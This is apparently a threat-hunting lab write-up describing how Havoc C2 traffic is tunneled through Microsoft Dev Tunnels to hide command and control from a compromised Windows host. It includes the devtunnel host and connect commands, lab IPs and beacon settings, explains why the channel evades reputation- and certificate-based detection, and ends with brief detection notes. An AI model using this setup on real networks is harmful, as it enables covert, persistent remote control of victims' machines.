# Stage 2: Command & Control
### Lab Setup

> **Malware:** [Havoc C2](https://github.com/HavocFramework/Havoc) and [MS Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/overview)
> **MITRE Tactics:** [TA0011 Command and Control](https://attack.mitre.org/tactics/TA0011/), [T1572_Protocol_Tunneling](https://attack.mitre.org/techniques/T1572/)
> **Traffic Type:** HTTPS
> **Connection Type:** Tunneled TCP
> **C2 Platform:** [Havoc C2](https://github.com/HavocFramework/Havoc)
> **Origin of Sample:** Active Countermeasures Threat Hunting Lab
> **Host Payload Delivery Method:** Executable (*.exe)
> **Target Host/Victim/Agent:** 10.20.30.2 (Windows 10 Pro x64)
> **MS Dev Tunnels Server:** 20.197.80.108
> **C2 Server:** 172.11.20.131 (Kali Linux)
> **Beacon Delay:** 02 seconds
> **Beacon Jitter:** 50%

### Understanding MS Dev Tunnels Role in Compromises
![[DevTunnel_Explain.png]]

Dev Tunnels can be configured in two fundamentally different ways. A half-tunnel establishes a connection between just one endpoint (either the victim system or the adversary system) and the Microsoft Dev Tunnels server. This creates only one segment of the potential communication path. In contrast, a full tunnel creates a complete endpoint-to-endpoint connection that bridges both systems through the Dev Tunnels server, enabling direct communication between the victim and adversary systems.

Further, the tunnel can accommodate different types of traffic flows to effectively mask their true nature. When used for Command and Control (C2), the tunnel carries egress traffic from victim to adversary, facilitating the typical command-response pattern of C2 communication. Alternatively, when used for remote access protocols like RDP or SSH, the tunnel carries ingress traffic flowing from the adversary to the victim system.

However, here’s the crucial aspect that makes this particularly significant for security: regardless of the actual traffic direction or protocol being used, the tunnel always presents itself to the victim’s network as outbound TLS traffic. This means that even when an adversary is actively connecting inbound to a victim’s system – for instance, through RDP – the connection appears in network logs and monitoring tools as a standard outbound HTTPS connection originating from the victim’s network.

Based on this, there are three main ways in which Dev Tunnels may be misused by threat actors: tunneling egress C2 traffic using a half-tunnel, tunneling egress C2 traffic using a full tunnel, or tunneling ingress traffic using a full tunnel.

### Execution

With code execution already established from Stage 1, the next objective was to upgrade this foothold into a durable, interactive C2 channel without exposing a directly reachable listener on the DMZ host.

**1. Attacker hosts the tunnel endpoint**, on the C2 server (172.11.20.131):

bash

```bash
devtunnel host -p 443 --allow-anonymous
```

![[dev.png]]

This exposes a Microsoft-hosted tunnel endpoint that the victim will connect out to. Because the tunnel is anonymous and TLS-wrapped by Microsoft's own infrastructure, it carries a valid, trusted certificate, not one that will trip certificate-based detection.

**2. Victim connects out to the tunnel**, using the existing code-execution foothold:

```powershell
devtunnel connect <tunnel_id>
```

![[dev2.png]]

This creates an outbound-only connection from Windows host to the Microsoft Dev Tunnels service. From the DMZ's perspective, this is indistinguishable from a legitimate developer using Dev Tunnels, a valid MS-signed HTTPS session to a Microsoft-owned endpoint.

**3. Havoc listener runs on the attacker's C2 server**, bound locally, and is reached through the tunnel rather than exposed directly:

The Havoc payload connects to `127.0.0.1` on its own end, which the local devtunnel client transparently forwards, through the Microsoft-hosted tunnel, back to the Havoc listener on 172.11.20.131. From a network monitoring standpoint at the DMZ boundary, this traffic is just outbound HTTPS to a Microsoft IP range, there is no direct, attributable connection to the attacker's actual C2 server address.

### Detection Considerations

_(To be expanded in the detection-engineering document, noting here as a placeholder for cross-reference.)_

- Standard IP/domain reputation and signature-based IDS rules are ineffective against this channel, since the destination is legitimate Microsoft infrastructure.
- Detection realistically depends on: host-level telemetry (Sysmon Event ID 3 for the devtunnel/agent process's outbound connection, Event ID 1 for process creation of `devtunnel.exe` or the Havoc agent itself on a server that has no legitimate reason to run either), and behavioral network analysis (beaconing interval/jitter pattern, unusual outbound volume from a DMZ web server to `*.devtunnels.ms`).

### Evidence

![[informer.png]]